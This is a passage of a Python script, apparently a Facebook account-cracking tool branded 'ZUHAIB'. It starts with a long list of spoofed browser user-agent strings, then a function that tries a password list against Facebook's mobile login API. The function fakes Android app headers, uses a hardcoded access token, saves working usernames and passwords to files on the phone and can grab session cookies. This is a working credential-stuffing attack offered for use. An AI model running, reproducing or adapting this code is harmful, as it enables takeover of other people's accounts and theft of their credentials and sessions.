Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v3082644513 t6703941201591042144 athfa3c3975 altpub cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v8655394166562125685 t6553294169466032708 ath5ee645e0 altpriv cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v3082647164 t6006063806750198674 athfa3c3975 altpub cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 RuxitSynthetic/1.0 v5783808878882613191 t1403586453951734988 ath2653ab72 altpriv cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v5973385287437470177 t5755185651384491427 ath5ee645e0 altpriv cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v3082655861 t3984374008602804876 athfa3c3975 altpub cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 RuxitSynthetic/1.0 v5765380714054028115 t5747064355914000718 ath259cea6f altpriv cvcv=2 smf=0 svfu=1
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v8872972448 t8617731838935940359 athfa3c3975 altpub cvcv=2 smf=0
Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36 RuxitSynthetic/1.0 v4795863969001110694 t6887521660640726643 ath1fb31b7a altpriv cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 RuxitSynthetic/1.0 v8623367250540758263 t1029548762767996041 ath4b3726d5 altpriv cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v3082665773 t2317642690233491935 athfa3c3975 altpub cvcv=2 smf=0 svfu=1
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36 RuxitSynthetic/1.0 v4702127043683762060 t7161013424628907418 ath5ee645e0 altpriv cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v3082668416 t6703941201591042144 athfa3c3975 altpub cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v3082671069 t6006063806750198674 athfa3c3975 altpub cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 RuxitSynthetic/1.0 v170631396672377548 t2855447945163266834 athe94ac249 altpriv cvcv=2 smf=0
Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36 RuxitSynthetic/1.0 v5315532114365840275 t5523802693953152063 ath1fb31b7a altpriv cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36 RuxitSynthetic/1.0 v7022494431548398899 t8449228325190938187 ath5ee645e0 altpriv cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 RuxitSynthetic/1.0 v8755093989051549016 t5648263770542704054 ath2653ab72 altpriv cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v3082679762 t3984374008602804876 athfa3c3975 altpub cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v8873054857 t8617731838935940359 athfa3c3975 altpub cvcv=2 smf=0
Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36 RuxitSynthetic/1.0 v5608863896674994816 t5747064355914000718 ath259cea6f altpriv cvcv=2 smf=0 svfu=1
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36 RuxitSynthetic/1.0 v2621450297721286890 t6553294169466032708 ath5ee645e0 altpriv cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v3082689678 t2317642690233491935 athfa3c3975 altpub cvcv=2 smf=0 svfu=1
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 RuxitSynthetic/1.0 v4865191788498561634 t8360729428027585528 ath259cea6f altpriv cvcv=2 smf=0 svfu=1
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v3082692451 t6703941201591042144 athfa3c3975 altpub cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v3082694976 t6006063806750198674 athfa3c3975 altpub cvcv=2 smf=0
Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36 RuxitSynthetic/1.0 v4426134885908612106 t6402838359464213558 ath259cea6f altpriv cvcv=2 smf=0 svfu=1
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v8873109914 t8617731838935940359 athfa3c3975 altpub cvcv=2 smf=0
Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36 RuxitSynthetic/1.0 v3711573451780061506 t1737404651745038500 ath1fb31b7a altpriv cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v3082703666 t3984374008602804876 athfa3c3975 altpub cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v1104569554869804706 t7161013424628907418 ath5ee645e0 altpriv cvcv=2 smf=0
Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36 RuxitSynthetic/1.0 v3780631651033185342 t6315332425969305434 ath259cea6f altpriv cvcv=2 smf=0 svfu=1
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v3082713576 t2317642690233491935 athfa3c3975 altpub cvcv=2 smf=0 svfu=1
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v3082716218 t6703941201591042144 athfa3c3975 altpub cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v6973343386087183823 t8449228325190938187 ath5ee645e0 altpriv cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v3082718869 t6006063806750198674 athfa3c3975 altpub cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v8873189691 t8617731838935940359 athfa3c3975 altpub cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 RuxitSynthetic/1.0 v6329702194744501969 t4147937780250091430 ath2653ab72 altpriv cvcv=2 smf=0
Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36 RuxitSynthetic/1.0 v3651412523064277149 t6887521660640726643 ath1fb31b7a altpriv cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v3027492994058057893 t6553294169466032708 ath5ee645e0 altpriv cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 RuxitSynthetic/1.0 v3408068943358951802 t2855447945163266834 athe94ac249 altpriv cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v3082726907 t3984374008602804876 athfa3c3975 altpub cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 RuxitSynthetic/1.0 v6850888285365560323 t832576955195415109 ath2653ab72 altpriv cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 RuxitSynthetic/1.0 v6583412278583605259 t5691531456657477892 athe94ac249 altpriv cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v3082736811 t2317642690233491935 athfa3c3975 altpub cvcv=2 smf=0 svfu=1
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 RuxitSynthetic/1.0 v6832269618617212966 t5648263770542704054 ath2653ab72 altpriv cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 RuxitSynthetic/1.0 v3211583470206979751 t4803866639546985847 athe94ac249 altpriv cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v3082739459 t6703941201591042144 athfa3c3975 altpub cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v3082742113 t6006063806750198674 athfa3c3975 altpub cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v3896069416479016690 t7161013424628907418 ath5ee645e0 altpriv cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v3082750816 t3984374008602804876 athfa3c3975 altpub cvcv=2 smf=0
"""
                
def rndm(ids,passlist):
        global loop
        global oks
        sys.stdout.write('\r\r\033[1;37m [\033[1;32mZUHAIB\033[1;37m] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                        fbbv = str(random.randint(111111111,999999999))
                        android_version = device['android_version']
                        model = device['model']
                        build = device['build']
                        fblc = device['fblc']
                        fbcr = sim_id
                        fbmf = device['fbmf']
                        fbbd = device['fbbd']
                        fbdv = device['fbdv']
                        fbsv = device['fbsv']
                        fbca = device['fbca']
                        fbdm = device['fbdm']
                        fbfw = '1'
                        fbrv = '0'
                        fban = 'FB4A'
                        fbpn = 'com.facebook.katana'
                        ua = 'Davik/2.1.0 (Linux; U; Android '+android_version+'.0.1; '+model+' Build/'+build+') [FBAN/'+fban+';FBAV/'+fbav+';FBBV/'+fbbv+';FBDM/{density=2.625,width=1080,height=1920};FBLC/'+fblc+';FBRV/'+str(random.randint(000000000,999999999))+';FBCR/'+fbcr+';FBMF/'+fbmf+';FBBD/'+fbbd+';FBPN/'+fbpn+';FBDV/'+fbdv+';FBSV/'+fbsv+';FBOP/19;FBCA/'+fbca+';]'
                        ua = '[FBAN/FB4A;FBAV/;[FBAN/FB4A;FBAV/400.0.0.37.76;FBBV/443234908;FBDM/{density=2.8125,width=1080,height=2131};FBLC/en_US;FBRV/444474383;FBCR/Telstra;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-S906E;FBSV/13;FBOP/1;FBCA/arm64-v8a:;]'
                        random_seed = random.Random()                       
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
                        family = str(uuid.uuid4())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        xd =str(''.join(random_seed.choices(string.digits, k=20)))
                        sim_serials = f'["{xd}"]'
                        li = ['28','29','210']
                        li2 = random.choice(li)
                        j1 = ''.join(random.choice(digits) for _ in range(2))
                        jazoest = li2+j1
                        data = {
                                'adid':adid,
                                'format':'json',
                                'device_id':device_id,
                                'email':ids,
                                'password':pas,
                                'generate_analytics_claims':'1',
                                'credentials_type':'password',
                                'source':'login',
                                'error_detail_type':'button_with_disabled',
                                'enroll_misauth':'false',
                                'generate_session_cookies':'1',
                                'generate_machine_id':'1',
                                'fb_api_req_friendly_name':'authenticate',
                        }
                        headers={
                                'Authorization':f'OAuth {accessToken}',
                                'X-FB-Friendly-Name':'authenticate',
                                'X-FB-Connection-Type':'unknown',
                                'User-Agent':ua,
                                'Accept-Encoding':'gzip, deflate',
                                'Content-Type': 'application/x-www-form-urlencoded',
                                'X-FB-HTTP-Engine': 'Liger'
                                }
                        url = 'https://b-graph.facebook.com/auth/login'
                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                try:
                                        uid = po['uid']
                                except:
                                        uid = ids
                                if str(uid) in oks:
                                        break
                                else:
                                	    
                                        print('\r\r\033[1;32m [ZUHAIB-OK] '+str(uid)+' √ '+pas+'\033[1;97m')
                                        open('/sdcard/ZUHAIB-OK.txt','a').write(str(uid)+'√'+pas+'\n')
                                        if c in ['y','Y']:                                        	
                                        	try:
                                        		q = json.loads(response.text)
                                        		ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                                        		ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                                        		cookies = f"sb={ssbb};{ckkk}"
                                        	except Exception as e:print(str(e)+' \n\033[1;32m[\033[1;37mCOOKIE\033[1;32m] \033[1;33m: \033[1;31m  '+response.text)
                                        oks.append(str(uid))
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                if cp in ['n','N']:
                                	pass
                                	                                	                                
                                try:
                                        uid = po['error']['error_data']['uid']
                                except:
                                        uid = ids
                                if str(uid) in oks:pass
                                else:
                                       # print('\r\r\033[1;37m [ZUHAIB-CP] '+str(uid)+' + '+pas+'\033[1;97m')
                                        open('/sdcard/ZUHAIB-CP.txt','a').write(str(uid)+'+'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
        except Exception as e:
                pass                
try:
        menu()
except requests.exceptions.ConnectionError:
        print('\n \033[1;32m[×] \033[1;31mNo Internet Connection...!')
        exit()
except Exception as e:pass

menu()
